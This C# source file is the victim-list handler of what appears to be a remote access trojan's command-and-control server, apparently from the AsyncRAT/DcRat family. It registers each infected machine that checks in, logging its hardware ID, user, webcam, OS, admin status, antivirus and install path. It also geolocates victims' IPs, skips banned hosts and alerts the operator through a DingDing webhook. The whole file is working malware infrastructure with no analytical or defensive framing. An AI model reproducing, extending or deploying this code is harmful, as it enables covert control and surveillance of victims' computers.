using System;
using System.Drawing;
using System.Media;
using System.Windows.Forms;
using IP2Region;
using Server.Connection;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

namespace Server.Handle_Packet
{
    public class HandleListView
    {
        public void AddToListview(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                lock (Settings.LockBlocked)
                {
                    try
                    {
                        if (Settings.Blocked.Count > 0)
                        {
                            if (Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
                            {
                                client.Disconnected();
                                return;
                            }

                            if (Settings.Blocked.Contains(client.Ip))
                            {
                                client.Disconnected();
                                return;
                            }
                        }
                    }
                    catch
                    {
                    }
                }

                client.Admin = false;
                if (unpack_msgpack.ForcePathObject("Admin").AsString.ToLower() != "user") client.Admin = true;

                client.LV = new ListViewItem
                {
                    Tag = client,
                    Text = string.Format("{0}:{1}", client.Ip, client.TcpClient.LocalEndPoint.ToString().Split(':')[1])
                };
                string[] ipinf;
                var address = "";
                try
                {
                    if (TimeZoneInfo.Local.Id == "China Standard Time")
                    {
                        using (var _search = new DbSearcher(Environment.CurrentDirectory + @"\Plugins\ip2region.db"))
                        {
                            var temp = _search.MemorySearch(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0])
                                .Region;
                            for (var i = 0; i < 5; i++)
                            {
                                if (i == 1)
                                    continue;
                                if (temp.Split('|')[i] != "" || temp.Split('|')[i] != " ")
                                    address = address + temp.Split('|')[i] + " ";
                            }
                        }

                        client.LV.SubItems.Add(address);
                    }
                    else
                    {
                        ipinf = Program.Form1.cGeoMain
                            .GetIpInf(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
                        client.LV.SubItems.Add(ipinf[1]);
                    }
                }
                catch
                {
                    client.LV.SubItems.Add("Unknown");
                }

                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Camera").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
                try
                {
                    client.LV.SubItems.Add(Convert.ToDateTime(unpack_msgpack.ForcePathObject("Install_ed").AsString)
                        .ToLocalTime().ToString());
                }
                catch
                {
                    try
                    {
                        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Install_ed").AsString);
                    }
                    catch
                    {
                        client.LV.SubItems.Add("??");
                    }
                }

                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Anti_virus").AsString);
                client.LV.SubItems.Add("0000 MS");
                client.LV.SubItems.Add("...");
                client.LV.ToolTipText =
                    "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
                client.LV.ToolTipText += "[Paste_bin] " + unpack_msgpack.ForcePathObject("Paste_bin").AsString;
                client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                client.LV.UseItemStyleForSubItems = false;
                client.LastPing = DateTime.Now;
                Program.Form1.Invoke((MethodInvoker)(() =>
                {
                    lock (Settings.LockListviewClients)
                    {
                        Program.Form1.listView1.Items.Add(client.LV);
                        Program.Form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                        Program.Form1.lv_act.Width = 500;
                    }

                    if (Properties.Settings.Default.Notification)
                    {
                        Program.Form1.notifyIcon1.BalloonTipText = $@"Connected 
{client.Ip} : {client.TcpClient.LocalEndPoint.ToString().Split(':')[1]}";
                        Program.Form1.notifyIcon1.ShowBalloonTip(100);
                        if (Properties.Settings.Default.DingDing && Properties.Settings.Default.WebHook != null &&
                            Properties.Settings.Default.Secret != null)
                            try
                            {
                                var content = $"Client {client.Ip} connected" + "\n"
                                                                              + "Group:" +
                                                                              unpack_msgpack.ForcePathObject("Group")
                                                                                  .AsString + "\n"
                                                                              + "User:" + unpack_msgpack
                                                                                  .ForcePathObject("User").AsString +
                                                                              "\n"
                                                                              + "OS:" + unpack_msgpack
                                                                                  .ForcePathObject("OS").AsString + "\n"
                                                                              + "User:" + unpack_msgpack
                                                                                  .ForcePathObject("Admin").AsString;
                                DingDing.Send(Properties.Settings.Default.WebHook, Properties.Settings.Default.Secret,
                                    content);
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.Message);
                            }
                    }

                    new HandleLogs().Addmsg($"Client {client.Ip} connected", Color.Green);
                    var local = TimeZoneInfo.Local;
                    if (local.Id == "China Standard Time" && Properties.Settings.Default.Notification)
                    {
                        var sp = new SoundPlayer(Resources.online);
                        sp.Load();
                        sp.Play();
                    }
                }));
            }
            catch
            {
            }
        }

        public void Received(Clients client)
        {
            try
            {
                lock (Settings.LockListviewClients)
                {
                    if (client.LV != null)
                        client.LV.ForeColor = Color.Empty;
                }
            }
            catch
            {
            }
        }
    }
}